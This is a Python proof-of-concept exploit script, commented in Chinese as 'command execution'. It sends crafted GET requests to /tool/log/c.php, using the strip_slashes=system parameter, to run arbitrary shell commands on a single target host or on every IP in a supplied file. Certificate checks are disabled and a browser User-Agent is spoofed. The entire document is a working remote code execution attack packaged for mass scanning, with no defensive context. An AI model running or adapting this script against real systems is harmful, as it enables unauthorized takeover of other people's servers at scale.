import requests
import click

requests.packages.urllib3.disable_warnings()


@click.command()
@click.option('-h', '--host', help='Destination address')
@click.option('-c', '--cmd',  help='Commands to be executed')
@click.option('-f', '--file',  help='Target file')

# 命令执行 
def poc(host, cmd, file):
    if host != None and cmd != None:
        url = "https://" + host + "/tool/log/c.php?strip_slashes=system&host=" + cmd
        heard = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
                }
        res = requests.get(url = url, headers=heard, timeout = 10, verify = False)
        print(res)
    if file != None and cmd != None:
        for ip in open(file):
            url = "https://" + ip.strip() + "/tool/log/c.php?strip_slashes=system&host=" + cmd
            heard = {
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
            }
            try:
                res = requests.get(url = url, headers=heard, timeout = 1, verify = False)
                print(res.text)
            except:
                pass

def main():
    poc()

if __name__ == '__main__':
    main()